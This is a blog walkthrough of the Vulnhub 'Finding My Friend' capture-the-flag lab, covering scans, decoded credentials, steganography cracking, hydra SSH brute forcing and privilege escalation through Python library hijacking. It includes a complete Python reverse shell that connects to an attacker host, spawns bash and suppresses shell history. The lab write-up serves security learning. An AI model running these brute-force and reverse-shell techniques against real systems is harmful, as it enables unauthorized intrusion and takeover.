---
title: "Finding My Friend - Vulnhub CTF Walkthrough"
---

#### nmap scan
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/finding-my-friend]
└─$ nmap -p- -sV 192.168.56.173
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-23 16:54 EDT
Nmap scan report for 192.168.56.173
Host is up (0.00044s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
{% endhighlight %}


#### gobuster
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/finding-my-friend]
└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.56.173 -q -x html,php,txt
/images               (Status: 301) [Size: 317] [--> http://192.168.56.173/images/]
/index.html           (Status: 200) [Size: 2275]                                   
/friend               (Status: 301) [Size: 317] [--> http://192.168.56.173/friend/]
{% endhighlight %}

Navigating to the `friend/` directory and looking through the source code shows
`NjMgNjEgNzAgNzQgNzUgNzIgNjUgM2EgNjggNzUgNmUgNzQgNjkgNmUgNjc=`

{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/finding-my-friend]
└─$ echo "NjMgNjEgNzAgNzQgNzUgNzIgNjUgM2EgNjggNzUgNmUgNzQgNjkgNmUgNjc=" | base64 -d
63 61 70 74 75 72 65 3a 68 75 6e 74 69 6e 67 
{% endhighlight %}

Converting the hey to ascii shows a username and pasword: `capture:hunting`
Time to try it with FTP


{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/finding-my-friend]
└─$ ftp 192.168.56.173      
Connected to 192.168.56.173.
220 (vsFTPd 3.0.3)
Name (192.168.56.173:kali): capture
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-x---    2 1002     1002         4096 Jan 06 07:45 .
drwxr-x---    2 1002     1002         4096 Jan 06 07:45 ..
-rwxr-x---    1 1002     1002       430882 Jan 06 07:45 .get.jpg
-rwxr-x---    1 1002     1002           29 Jan 06 07:45 flag1.txt
-rwxr-x---    1 1002     1002        34608 Jan 06 07:45 getme
-rwxr-x---    1 1002     1002           76 Jan 06 07:45 note.txt
226 Directory send OK.
ftp>
{% endhighlight %}

Getting the first flag:
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/finding-my-friend]
└─$ cat flag1.txt            
tryhackme{Th1s1sJustTh3St4rt}
{% endhighlight %}

Running strings on the `getme` data showed the following: 
{% highlight text %}
iTXtXML:com.adobe.xmp
<?xpacket begin='
' id='W5M0MpCehiHzreSzNTczkc9d'?>
<x:xmpmeta xmlns:x='adobe:ns:meta/' x:xmptk='Image::ExifTool 12.03'>
<rdf:RDF xmlns:rdf='http://www.w3.org/1999/02/22-rdf-syntax-ns#'>
 <rdf:Description rdf:about=''
  xmlns:dc='http://purl.org/dc/elements/1.1/'>
  <dc:rights>
   <rdf:Alt>
    <rdf:li xml:lang='x-default'>This might help you A@==:E@</rdf:li>
   </rdf:Alt>
  </dc:rights>
 </rdf:Description>
</rdf:RDF>
</x:xmpmeta>
<?xpacket end='r'?>of
]gy'nC2-3k2
{% endhighlight %}

note.txt: 
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/finding-my-friend]
└─$ cat note.txt 
I have an image but I’m not able to open it. Can you help me to open it?
{% endhighlight %}


Using `stegcracker` to crack the `get.jpg`: 
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/finding-my-friend]
└─$ stegcracker get.jpg /usr/share/wordlists/rockyou.txt                        2 ⨯
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2021 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'get.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: pollito
Tried 975 passwords
Your file has been written to: get.jpg.out
pollito
{% endhighlight %}

The data extracted is in morse code, so let's throw that into a translator: 
`.--- --- .... -. ---... -... --- --- --. .. . .-- --- --- --. .. .`
to:
`john:boogiewoogie`

so we've got credentials for either ssh or ftp. It didn't work with FTP, so let's 
see about SSH.

Got a shell. Here's the second flag
{% highlight terminal %}
tryhackme{gI33fuIbutM0r3t0gO}
{% endhighlight %}


Time to enumerate the local file system to see if there's anything
useful:

clue.txt:
{% highlight text %}
You need to find which college is she studying.



Hint: Her brother parth knows that.
{% endhighlight %}

Brute forcing `parth` with hydra: 
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/finding-my-friend]
└─$ hydra -l parth -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.173 -V
-- SNIP! --

[22][ssh] host: 192.168.56.173   login: parth   password: johnnydepp

{% endhighlight %}

Getting the third flag: 
`tryhackme{Sh3is@lm0stn3@rtoY0u}`

Another clue in the `honey.txt` file after logging into the `parth` user: 
{% highlight text %}
My home directory might help you.
{% endhighlight %}


{% highlight terminal %}
parth@findingmyfriend:~$ sudo -l
Matching Defaults entries for parth on findingmyfriend:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User parth may run the following commands on findingmyfriend:
    (honey) NOPASSWD: /home/honey/.../backup.py

{% endhighlight %}

What does `backup.py` do?

{% highlight python %}
#!/usr/bin/env python3
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/tmp/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/findingmyfriend', zipf)
    zipf.close()
{% endhighlight %}

This script backs up the website to the `tmp` directory as a zip file. parth has no
write permissions on the script. using the [following method](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/) we'll hijack the `zipfile`
library and get a reverse shell on the system. 


{% highlight python %}
import os
import pty
import socket

lhost = "192.168.56.101"
lport = 4444

ZIP_DEFLATED = 0

class ZipFile:
    def close(*args):
        return

    def write(*args):
        return

    def __init__(self, *args):
        return

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.putenv("HISTFILE",'/dev/null')
pty.spawn("/bin/bash")
s.close()
{% endhighlight %}

After getting the file on the system, we'll set up a listener on the attacking
machine. After doing so we can check `sudo -l` to see what this user can run on the 
system: 

{% highlight terminal %}
honey@findingmyfriend:/home$ sudo -l
sudo -l
Matching Defaults entries for honey on findingmyfriend:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User honey may run the following commands on findingmyfriend:
    (ALL) NOPASSWD: ALL
honey@findingmyfriend:/home$ 
{% endhighlight %}

Now we can use `sudo -i` to get a root shell: 
{% highlight terminal %}
honey@findingmyfriend:/home$ sudo -i
sudo -i
root@findingmyfriend:~# 
{% endhighlight %}


Getting the final flag after getting root: 
`tryhackme{F1n@llyIFInD3dH3r}`
